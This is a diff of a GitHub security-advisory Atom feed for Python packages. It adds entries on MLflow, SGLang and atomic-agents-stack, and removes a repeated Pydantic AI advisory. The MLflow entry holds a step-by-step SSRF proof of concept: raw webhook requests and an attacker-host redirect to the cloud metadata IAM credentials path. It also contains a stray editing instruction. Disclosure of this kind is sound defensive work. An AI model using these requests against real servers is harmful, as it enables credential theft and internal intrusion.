@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-08-17T21:15:08.328Z</updated>
+    <updated>2026-08-17T22:12:14.059Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,213 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[mlflow] MLflow: Unauthenticated full-read SSRF in webhook delivery: _validate_webhook_url bypassed via unvalidated HTTP redirects (and DNS rebinding)]]></title>
+        <id>https://github.com/advisories/GHSA-7gwp-5pfp-969j</id>
+        <link href="https://github.com/advisories/GHSA-7gwp-5pfp-969j"/>
+        <updated>2026-08-17T21:58:52.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The default MLflow Tracking Server (<code>mlflow server</code>, no authentication, default SQLite backend) exposes the model-registry webhooks API unauthenticated, including a synchronous <code>POST /api/2.0/mlflow/webhooks/{id}/test</code> endpoint that returns the upstream response status and body to the caller. The SSRF guard added in PR #20747 (<code>_validate_webhook_url</code>, shipped in 3.10.0) resolves the webhook hostname and rejects non-public IPs, but it is bypassable: delivery follows HTTP redirects (no <code>allow_redirects=False</code>) and never pins the validated IP. An attacker hosts a public HTTPS endpoint that passes the guard and returns <code>302 Location: http://169.254.169.254/...</code> (or <code>http://127.0.0.1:...</code>); MLflow follows it and never re-validates the redirect target. Because <code>/test</code> reflects the response body, this is an unauthenticated full-read SSRF on a default server.</p>
+<h3 id="details">Details</h3>
+<p>Three facts combine:</p>
+<ol>
+<li><p>Webhook endpoints are unauthenticated on a default server. The only webhook authorization lives in the optional auth plugin (<code>mlflow/server/auth/__init__.py</code>, <code>WEBHOOK_BEFORE_REQUEST_HANDLERS</code>), which is not loaded by default.</p>
+</li>
+<li><p>The guard validates but pins nothing — <code>mlflow/utils/validation.py</code> <code>_validate_webhook_url</code>:</p>
+</li>
+</ol>
+<pre><code class="language-python">schemes = _MLFLOW_WEBHOOK_ALLOWED_SCHEMES.get()        # default ["https"]
+if parsed_url.scheme not in schemes: raise ...
+if not _MLFLOW_WEBHOOK_ALLOW_PRIVATE_IPS.get():        # default False
+    for addr_info in socket.getaddrinfo(hostname, None):
+        ip = ipaddress.ip_address(addr_info[4][0])
+        if not ip.is_global: raise ...                 # blocks RFC1918/loopback/link-local/metadata
+</code></pre>
+<p>The resolved IP is never carried into the connection.</p>
+<ol start="3">
+<li>Delivery follows redirects and re-resolves with no pinning — mlflow/webhooks/delivery.py:</li>
+</ol>
+<pre><code class="language-python">def _create_webhook_session():
+    adapter = HTTPAdapter(max_retries=retry_strategy)  # retry only; no IP pinning
+    ...
+def _send_webhook_request(webhook, payload, event, session):
+    _validate_webhook_url(webhook.url)                 # re-validates the ORIGINAL url only
+    return session.post(webhook.url, data=payload_bytes, headers=headers, timeout=timeout)
+    # no allow_redirects=False  -&gt; 302 followed; redirect Location never re-validated
+</code></pre>
+<p>test_webhook returns response_status and response_body to the caller.
+Bypass vectors:</p>
+<p>Redirect-follow (reliable): attacker's allow-listed HTTPS host returns 302 to an internal/metadata URL; requests follows it.
+DNS rebinding (TOCTOU): getaddrinfo in the guard and the requests connect resolve independently with no pinning.</p>
+<h3 id="poc">PoC</h3>
+<p>All requests are unauthenticated, sent to the MLflow tracking server (<code>{{TARGET}}</code>). The SSRF
+fetch is performed by the MLflow server itself; the internal response is reflected back in the
+<code>/test</code> response. <code>{{ATTACKER}}</code> is a host the researcher controls that resolves to a public IP
+and serves HTTPS with a valid certificate, returning a 302 redirect to an internal target.</p>
+<p>Attacker redirect server (on {{ATTACKER}}, valid TLS cert):
+    nginx:  location / { return 302 <a href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">http://169.254.169.254/latest/meta-data/iam/security-credentials/</a>; }</p>
+<p>Step 0 — negative control (proves the guard is active; the naive internal URL is rejected):</p>
+<pre><code>POST /api/2.0/mlflow/webhooks HTTP/1.1
+Host: {{TARGET}}
+Content-Type: application/json
+
+{"name":"neg","url":"http://127.0.0.1:6379/","events":[{"entity":"REGISTERED_MODEL","action":"CREATED"}]}
+
+-&gt; 400 {"message":"Invalid webhook URL scheme: 'http'. Allowed schemes are: https."}
+(an https://127.0.0.1/ variant is likewise rejected as a non-public IP)
+</code></pre>
+<img width="1154" height="437" alt="image" src="https://github.com/user-attachments/assets/509f3a14-8774-4785-b99a-864f0b448019">
+
+
+<p>Step 1 — create a webhook pointing at the attacker's public HTTPS host (passes _validate_webhook_url):</p>
+<pre><code>POST /api/2.0/mlflow/webhooks HTTP/1.1
+Host: {{TARGET}}
+Content-Type: application/json
+
+{"name":"poc","url":"https://{{ATTACKER}}/innocent","events":[{"entity":"REGISTERED_MODEL","action":"CREATED"}]}
+
+-&gt; 200 {"webhook":{"webhook_id":"&lt;WEBHOOK_ID&gt;", ... ,"status":"ACTIVE"}}
+</code></pre>
+<img width="1394" height="520" alt="image" src="https://github.com/user-attachments/assets/9004705f-67e1-486f-a905-1f744eb3636d">
+
+
+<p>Step 2 — fire it via the unauthenticated /test endpoint; the internal response body is returned:</p>
+<pre><code>POST /api/2.0/mlflow/webhooks/&lt;WEBHOOK_ID&gt;/test HTTP/1.1
+Host: {{TARGET}}
+Content-Type: application/json
+
+{"webhook_id":"&lt;WEBHOOK_ID&gt;","event":{"entity":"REGISTERED_MODEL","action":"CREATED"}}
+
+-&gt; 200 {"result":{"success":true,"response_status":200,
+        "response_body":"&lt;contents of http://169.254.169.254/latest/meta-data/... fetched by the server&gt;"}}
+</code></pre>
+<img width="1399" height="453" alt="image" src="https://github.com/user-attachments/assets/1e5bb020-0855-4be8-a53b-e97daeabf1dc">
+
+
+<p>Confirmed live against mlflow==3.13.0 (default sqlite server). With the attacker host redirecting
+to a local secret service, Step 2 returned:
+    "response_body":"INTERNAL_SECRET=mlflow_ssrf_proof_7f3a91\nrole=admin\n"</p>
+<p>For convenience, the "my secret data" is saved in the same location.</p>
+<img width="730" height="208" alt="image" src="https://github.com/user-attachments/assets/680e1895-6d2e-4fd7-838f-c484561b6e5c">
+
+
+
+<p>Notes:</p>
+<ul>
+<li><p>Webhook <code>events</code> enum values must be UPPERCASE proto names (REGISTERED_MODEL, CREATED); lowercase
+maps to ENTITY_UNSPECIFIED and 500s.</p>
+</li>
+<li><p>Default allowed scheme is https only; the first hop must be https, the redirect Location may be http.</p>
+</li>
+<li><p>Webhooks require a SQL store; the default <code>mlflow server</code> (sqlite:///mlflow.db) qualifies. No auth needed.</p>
+</li>
+<li><p>Credit / independent discovery: Originally reported privately by @freeman-bb via this advisory on 2026-06-12. The same vulnerability was independently discovered through code review and reported publicly by @AUTHENSOR in issue #24179 on 2026-06-26. Fixed in PR #24258. Discovery priority belongs to @freeman-bb; @AUTHENSOR is credited as an independent finder.</p>
+</li>
+</ul>
+<h3 id="impact">Impact</h3>
+<p>An unauthenticated attacker who can reach the tracking server makes the server issue HTTP requests to arbitrary internal/loopback/cloud-metadata endpoints and reads the responses via /test: cloud instance-metadata (e.g. AWS IMDS IAM credentials), internal-only admin services behind the network boundary, and internal port/host scanning. The event-driven delivery path gives the same SSRF blindly; /test makes it full-read. This is an incomplete fix of the PR #20747 guard, confirmed present on the latest release (3.13.0) and on master. Not a duplicate of CVE-2025-14279 (browser-side rebinding CSRF, CWE-352).</p>
+<h3 id="fix">Fix</h3>
+<p>Fixed in <a href="https://github.com/mlflow/mlflow/pull/24258">https://github.com/mlflow/mlflow/pull/24258</a> (commit <code>ba94952247</code>), which adds connection-time SSRF protection (<code>SSRFProtectedHTTPAdapter</code>): the peer IP of each connected socket is validated against public-IP rules immediately after <code>connect()</code>, before any TLS/HTTP exchange. This covers the redirect targets as well (each redirect opens a new connection through the protected pool), closing both the 302-read and 307/308-write variants and the DNS-rebinding TOCTOU.</p>
+<h3 id="redirect-variants">Redirect variants</h3>
+<p>The same missing re-validation enables two distinct primitives depending on the redirect status code:</p>
+<ul>
+<li><strong>302 (read):</strong> the redirect target is fetched with GET and, because <code>POST /api/2.0/mlflow/webhooks/{id}/test</code> reflects the upstream response body (<code>WebhookTestResult.response_body</code>), the attacker reads arbitrary internal HTTP responses (cloud metadata, internal services).</li>
+<li><strong>307 / 308 (blind write):</strong> these preserve the original POST method and body, so the attacker can POST attacker-controlled payloads into private-network management endpoints that act on POST (e.g. Docker daemon <code>/stop</code>, Elasticsearch <code>/_close</code>, Spring Boot Actuator <code>/shutdown</code>).</li>
+</ul>
+<p>Neither requires authentication on a default OSS server.</p>
+<p>Then add a fix reference near the top or in a "Remediation" note:</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/mlflow/mlflow/security/advisories/GHSA-7gwp-5pfp-969j">https://github.com/mlflow/mlflow/security/advisories/GHSA-7gwp-5pfp-969j</a></li>
+<li><a href="https://github.com/mlflow/mlflow/issues/24179">https://github.com/mlflow/mlflow/issues/24179</a></li>
+<li><a href="https://github.com/mlflow/mlflow/pull/24258">https://github.com/mlflow/mlflow/pull/24258</a></li>
+<li><a href="https://github.com/mlflow/mlflow/commit/ba949522477cbd5915aa55d29b0cfad7d5ddf939">https://github.com/mlflow/mlflow/commit/ba949522477cbd5915aa55d29b0cfad7d5ddf939</a></li>
+<li><a href="https://github.com/mlflow/mlflow/releases/tag/v3.15.0">https://github.com/mlflow/mlflow/releases/tag/v3.15.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-7gwp-5pfp-969j">https://github.com/advisories/GHSA-7gwp-5pfp-969j</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7gwp-5pfp-969j</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-08-17T21:58:51.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[sglang] SGLang is Vulnerable to DoS via the data_hash Function]]></title>
+        <id>https://github.com/advisories/GHSA-jrcc-j37m-v8fg</id>
+        <link href="https://github.com/advisories/GHSA-jrcc-j37m-v8fg"/>
+        <updated>2026-08-17T21:52:50.000Z</updated>
+        <content type="html"><![CDATA[<p>A vulnerability was determined in sgl-project SGLang up to 0.5.11. Affected by this vulnerability is the function data_hash of the component Cache Handler. This manipulation causes denial of service. The attack is restricted to local execution. A high degree of complexity is needed for the attack. The exploitation appears to be difficult. The exploit has been publicly disclosed and may be utilized. The pull request to fix this issue awaits acceptance.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-10775">https://nvd.nist.gov/vuln/detail/CVE-2026-10775</a></li>
+<li><a href="https://github.com/sgl-project/sglang/issues/25462">https://github.com/sgl-project/sglang/issues/25462</a></li>
+<li><a href="https://github.com/sgl-project/sglang/pull/22033">https://github.com/sgl-project/sglang/pull/22033</a></li>
+<li><a href="https://github.com/sgl-project/sglang">https://github.com/sgl-project/sglang</a></li>
+<li><a href="https://vuldb.com/cve/CVE-2026-10775">https://vuldb.com/cve/CVE-2026-10775</a></li>
+<li><a href="https://vuldb.com/submit/831438">https://vuldb.com/submit/831438</a></li>
+<li><a href="https://vuldb.com/vuln/368138">https://vuldb.com/vuln/368138</a></li>
+<li><a href="https://vuldb.com/vuln/368138/cti">https://vuldb.com/vuln/368138/cti</a></li>
+<li><a href="https://github.com/advisories/GHSA-jrcc-j37m-v8fg">https://github.com/advisories/GHSA-jrcc-j37m-v8fg</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jrcc-j37m-v8fg</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-06-04T00:30:25.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[atomic-agents-stack] atomic-agents-stack: Parallel helper/delegate batch reserves $0 for models absent from the pricing table, bypassing the cost-cap fan-out guard]]></title>
+        <id>https://github.com/advisories/GHSA-j659-8xh6-5pq5</id>
+        <link href="https://github.com/advisories/GHSA-j659-8xh6-5pq5"/>
+        <updated>2026-08-17T21:50:02.000Z</updated>
+        <content type="html"><![CDATA[<p><code>_estimate_batch_cost</code> (<code>atomic_agents/agent.py</code>) looks up the per-model output price with <code>PRICING.get(model, {})</code>, returning 0.0 for any model not in the hardcoded pricing table. <code>_check_batch_reservation</code> then early-returns when the reservation is &lt;= 0, skipping the batch reservation entirely. That reservation is the only defense against the documented fan-out race where every parallel helper/delegate reads the identical pre-batch on-disk cost total and each passes its individual check even though the collective spend overruns the configured cap.</p>
+<p><strong>Impact:</strong> an operator running any model not in the pricing table (self-hosted/Ollama/vLLM, a new provider SKU) with <code>cost_guardrails</code> + <code>daily_cap_usd</code> set believes the cap protects them, but a single parallel batch can blow past the cap. The parallel-helper <code>model</code> argument can also be steered to an unknown id. The sibling <code>dream._estimate_dream_cost</code> does this correctly (<code>PRICING.get(model, _fallback_pricing())</code>), which makes this a clear defect.</p>
+<p><strong>Affected:</strong> <code>agent.py</code> (<code>_estimate_batch_cost</code> / <code>_check_batch_reservation</code>), all versions through 1.0.0.</p>
+<p><strong>Fix:</strong> use <code>PRICING.get(model, _costs._fallback_pricing())['output']</code> (mirror dream/calc_cost). Add a conformance test asserting an unknown-model batch reserves &gt; 0 and that an over-cap unknown-model batch raises <code>CostGuardrailBlocked</code>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/dep0we/atomic-agents-stack/security/advisories/GHSA-j659-8xh6-5pq5">https://github.com/dep0we/atomic-agents-stack/security/advisories/GHSA-j659-8xh6-5pq5</a></li>
+<li><a href="https://github.com/dep0we/atomic-agents-stack/releases#release-v1.1.0">https://github.com/dep0we/atomic-agents-stack/releases#release-v1.1.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-j659-8xh6-5pq5">https://github.com/advisories/GHSA-j659-8xh6-5pq5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-j659-8xh6-5pq5</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-08-17T21:50:01.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[atomic-agents-stack] atomic-agents-stack: HTTP MCP catalog accepts cleartext http and spawns catalog-supplied commands (MITM to RCE)]]></title>
+        <id>https://github.com/advisories/GHSA-xhcr-cqfr-m3hv</id>
+        <link href="https://github.com/advisories/GHSA-xhcr-cqfr-m3hv"/>
+        <updated>2026-08-17T21:49:55.000Z</updated>
+        <content type="html"><![CDATA[<p>The HTTP MCP server-registry backend factory (<code>atomic_agents/mcp_registry/http.py</code>, <code>make_http_mcp_server_registry_backend_from_url</code>) accepts both <code>http</code> and <code>https</code> schemes. Catalog entries carry <code>command</code>/<code>args</code> that are type-validated but content-unrestricted, and are later spawned as local stdio subprocesses by <code>MCPClientPool</code>. Over a cleartext <code>http://</code> catalog URL, a network man-in-the-middle can rewrite the catalog response to inject an arbitrary <code>command</code>/<code>args</code> and obtain code execution on the agent host, with no LLM involvement. The Policy MCP allowlist is not a default mitigation (<code>mcp_allow_fn</code> defaults to None), so absent an operator-authored allowlist every resolved spec connects.</p>
+<p><strong>Affected:</strong> <code>mcp_registry/http.py</code>, all versions through 1.0.0. (The <code>https</code> path is sound: <code>httpx</code> defaults to <code>verify=True</code>, <code>follow_redirects=False</code>.)</p>
+<p><strong>Fix:</strong> require <code>https</code> by default and gate <code>http://</code> behind a loud explicit opt-in. Defense-in-depth: allowlist the resolved command basename (or require confirmation) before any registry-sourced subprocess spawn. Document the consequence in spec/36.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/dep0we/atomic-agents-stack/security/advisories/GHSA-xhcr-cqfr-m3hv">https://github.com/dep0we/atomic-agents-stack/security/advisories/GHSA-xhcr-cqfr-m3hv</a></li>
+<li><a href="https://github.com/dep0we/atomic-agents-stack/releases#release-v1.1.0">https://github.com/dep0we/atomic-agents-stack/releases#release-v1.1.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-xhcr-cqfr-m3hv">https://github.com/advisories/GHSA-xhcr-cqfr-m3hv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-xhcr-cqfr-m3hv</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-08-17T21:49:55.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[sqlparse] sqlparse: Inefficient Regex Handling of Dollar-Quoted SQL Literals Leads to ReDoS (Denial of Service)]]></title>
         <id>https://github.com/advisories/GHSA-prg7-hcfm-mfcr</id>
@@ -1760,128 +1967,5 @@ elif typ == TYPE_DATA:
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-07-24T22:37:17.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[atomic-agents-stack] atomic-agents-stack: Dashboard HTTP server path traversal allows arbitrary file read]]></title>
-        <id>https://github.com/advisories/GHSA-rm43-82j9-r4mj</id>
-        <link href="https://github.com/advisories/GHSA-rm43-82j9-r4mj"/>
-        <updated>2026-08-13T14:17:14.000Z</updated>
-        <content type="html"><![CDATA[<p>The optional dashboard HTTP server (<code>atomic_agents/dashboard/serve.py</code>) builds filesystem paths directly from the request path and serves them without a containment check. It is the only per-request untrusted-path site in the codebase that does not route through <code>_io.safe_resolve_under</code>. Literal <code>../</code> segments survive <code>urlparse</code> and <code>Path</code> joining, so a request can read files outside the intended <code>agents_root</code> (including via the static branch).</p>
-<p><strong>Impact:</strong> arbitrary file read. The default bind is loopback, but <code>--host</code> is an operator-settable documented flag; binding <code>0.0.0.0</code> exposes this to the LAN. Even on loopback it is reachable via DNS-rebinding from a browser or SSRF from a co-located service.</p>
-<p><strong>Affected:</strong> <code>dashboard/serve.py</code> (<code>DashboardHandler.do_GET</code> / <code>_serve_file</code>), all versions through 1.0.0.</p>
-<p><strong>Fix:</strong> route every served path through <code>_io.safe_resolve_under</code> against the intended root and return 404 on <code>PathTraversalError</code>; reject <code>..</code>/separators early; optionally refuse a non-loopback <code>--host</code> unless an explicit auth/allow flag is set (matching <code>serve/_app.py</code>).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/dep0we/atomic-agents-stack/security/advisories/GHSA-rm43-82j9-r4mj">https://github.com/dep0we/atomic-agents-stack/security/advisories/GHSA-rm43-82j9-r4mj</a></li>
-<li><a href="https://github.com/dep0we/atomic-agents-stack/commit/ec474f458122c5c0ca718d0df3078c8080338b2c">https://github.com/dep0we/atomic-agents-stack/commit/ec474f458122c5c0ca718d0df3078c8080338b2c</a></li>
-<li><a href="https://github.com/advisories/GHSA-rm43-82j9-r4mj">https://github.com/advisories/GHSA-rm43-82j9-r4mj</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rm43-82j9-r4mj</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-08-13T14:17:13.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pydantic-ai] Pydantic AI: Unvalidated UploadedFile references in UI adapters allow server-side file access using the application's credentials]]></title>
-        <id>https://github.com/advisories/GHSA-h7p7-w5gc-xj3w</id>
-        <link href="https://github.com/advisories/GHSA-h7p7-w5gc-xj3w"/>
-        <updated>2026-08-13T14:16:27.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A client that can submit message history to a Pydantic AI UI adapter can reference arbitrary files in the application's model-provider or cloud-storage account. The server forwards the reference to the model provider, which fetches it using the server's own credentials, allowing the client to read files it should not have access to.</p>
-<h3 id="details">Details</h3>
-<p>UI adapters reconstruct file parts from client-submitted message history and forward them to the model provider. File <strong>URL</strong> parts are validated against a scheme allowlist before being forwarded, but <code>UploadedFile</code> references — which point to a file by provider file ID or cloud-storage URI (e.g. <code>s3://…</code>, <code>gs://…</code>) — were forwarded without validation.</p>
-<p>Because the provider resolves an <code>UploadedFile</code> using the server-side identity (IAM role, service account, or provider API key) rather than the client's, a client that crafts message history containing an attacker-chosen <code>UploadedFile</code> can cause the server to read objects belonging to its own account or to other tenants, given a referenceable identifier.</p>
-<h3 id="impact">Impact</h3>
-<p>Applications that pass untrusted client-submitted message history to an agent through a UI adapter (such as the Vercel AI adapter). Exploitation requires the attacker to reference a valid file identifier; depending on how the application names objects, such identifiers are not always unguessable.</p>
-<h3 id="patches">Patches</h3>
-<p>Upgrade to <code>1.106.0</code> (1.x) or <code>2.0.0b6</code> (the 2.x beta line), which validate <code>UploadedFile</code> references on client-submitted messages the same way file URLs are validated.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>If users cannot upgrade, do not pass untrusted client-submitted message history to the agent, or strip <code>UploadedFile</code> parts from incoming messages before running the agent.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-h7p7-w5gc-xj3w">https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-h7p7-w5gc-xj3w</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-54249">https://nvd.nist.gov/vuln/detail/CVE-2026-54249</a></li>
-<li><a href="https://github.com/pydantic/pydantic-ai/releases/tag/v1.106.0">https://github.com/pydantic/pydantic-ai/releases/tag/v1.106.0</a></li>
-<li><a href="https://github.com/pydantic/pydantic-ai/releases/tag/v2.0.0b6">https://github.com/pydantic/pydantic-ai/releases/tag/v2.0.0b6</a></li>
-<li><a href="https://github.com/advisories/GHSA-h7p7-w5gc-xj3w">https://github.com/advisories/GHSA-h7p7-w5gc-xj3w</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-h7p7-w5gc-xj3w</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-08-13T14:16:26.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pydantic-ai] Pydantic AI: Unvalidated UploadedFile references in UI adapters allow server-side file access using the application's credentials]]></title>
-        <id>https://github.com/advisories/GHSA-h7p7-w5gc-xj3w</id>
-        <link href="https://github.com/advisories/GHSA-h7p7-w5gc-xj3w"/>
-        <updated>2026-08-13T14:16:27.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A client that can submit message history to a Pydantic AI UI adapter can reference arbitrary files in the application's model-provider or cloud-storage account. The server forwards the reference to the model provider, which fetches it using the server's own credentials, allowing the client to read files it should not have access to.</p>
-<h3 id="details">Details</h3>
-<p>UI adapters reconstruct file parts from client-submitted message history and forward them to the model provider. File <strong>URL</strong> parts are validated against a scheme allowlist before being forwarded, but <code>UploadedFile</code> references — which point to a file by provider file ID or cloud-storage URI (e.g. <code>s3://…</code>, <code>gs://…</code>) — were forwarded without validation.</p>
-<p>Because the provider resolves an <code>UploadedFile</code> using the server-side identity (IAM role, service account, or provider API key) rather than the client's, a client that crafts message history containing an attacker-chosen <code>UploadedFile</code> can cause the server to read objects belonging to its own account or to other tenants, given a referenceable identifier.</p>
-<h3 id="impact">Impact</h3>
-<p>Applications that pass untrusted client-submitted message history to an agent through a UI adapter (such as the Vercel AI adapter). Exploitation requires the attacker to reference a valid file identifier; depending on how the application names objects, such identifiers are not always unguessable.</p>
-<h3 id="patches">Patches</h3>
-<p>Upgrade to <code>1.106.0</code> (1.x) or <code>2.0.0b6</code> (the 2.x beta line), which validate <code>UploadedFile</code> references on client-submitted messages the same way file URLs are validated.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>If users cannot upgrade, do not pass untrusted client-submitted message history to the agent, or strip <code>UploadedFile</code> parts from incoming messages before running the agent.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-h7p7-w5gc-xj3w">https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-h7p7-w5gc-xj3w</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-54249">https://nvd.nist.gov/vuln/detail/CVE-2026-54249</a></li>
-<li><a href="https://github.com/pydantic/pydantic-ai/releases/tag/v1.106.0">https://github.com/pydantic/pydantic-ai/releases/tag/v1.106.0</a></li>
-<li><a href="https://github.com/pydantic/pydantic-ai/releases/tag/v2.0.0b6">https://github.com/pydantic/pydantic-ai/releases/tag/v2.0.0b6</a></li>
-<li><a href="https://github.com/advisories/GHSA-h7p7-w5gc-xj3w">https://github.com/advisories/GHSA-h7p7-w5gc-xj3w</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-h7p7-w5gc-xj3w</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-08-13T14:16:26.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pydantic-ai-slim] Pydantic AI: Unvalidated UploadedFile references in UI adapters allow server-side file access using the application's credentials]]></title>
-        <id>https://github.com/advisories/GHSA-h7p7-w5gc-xj3w</id>
-        <link href="https://github.com/advisories/GHSA-h7p7-w5gc-xj3w"/>
-        <updated>2026-08-13T14:16:27.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A client that can submit message history to a Pydantic AI UI adapter can reference arbitrary files in the application's model-provider or cloud-storage account. The server forwards the reference to the model provider, which fetches it using the server's own credentials, allowing the client to read files it should not have access to.</p>
-<h3 id="details">Details</h3>
-<p>UI adapters reconstruct file parts from client-submitted message history and forward them to the model provider. File <strong>URL</strong> parts are validated against a scheme allowlist before being forwarded, but <code>UploadedFile</code> references — which point to a file by provider file ID or cloud-storage URI (e.g. <code>s3://…</code>, <code>gs://…</code>) — were forwarded without validation.</p>
-<p>Because the provider resolves an <code>UploadedFile</code> using the server-side identity (IAM role, service account, or provider API key) rather than the client's, a client that crafts message history containing an attacker-chosen <code>UploadedFile</code> can cause the server to read objects belonging to its own account or to other tenants, given a referenceable identifier.</p>
-<h3 id="impact">Impact</h3>
-<p>Applications that pass untrusted client-submitted message history to an agent through a UI adapter (such as the Vercel AI adapter). Exploitation requires the attacker to reference a valid file identifier; depending on how the application names objects, such identifiers are not always unguessable.</p>
-<h3 id="patches">Patches</h3>
-<p>Upgrade to <code>1.106.0</code> (1.x) or <code>2.0.0b6</code> (the 2.x beta line), which validate <code>UploadedFile</code> references on client-submitted messages the same way file URLs are validated.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>If users cannot upgrade, do not pass untrusted client-submitted message history to the agent, or strip <code>UploadedFile</code> parts from incoming messages before running the agent.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-h7p7-w5gc-xj3w">https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-h7p7-w5gc-xj3w</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-54249">https://nvd.nist.gov/vuln/detail/CVE-2026-54249</a></li>
-<li><a href="https://github.com/pydantic/pydantic-ai/releases/tag/v1.106.0">https://github.com/pydantic/pydantic-ai/releases/tag/v1.106.0</a></li>
-<li><a href="https://github.com/pydantic/pydantic-ai/releases/tag/v2.0.0b6">https://github.com/pydantic/pydantic-ai/releases/tag/v2.0.0b6</a></li>
-<li><a href="https://github.com/advisories/GHSA-h7p7-w5gc-xj3w">https://github.com/advisories/GHSA-h7p7-w5gc-xj3w</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-h7p7-w5gc-xj3w</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-08-13T14:16:26.000Z</published>
     </entry>
 </feed>
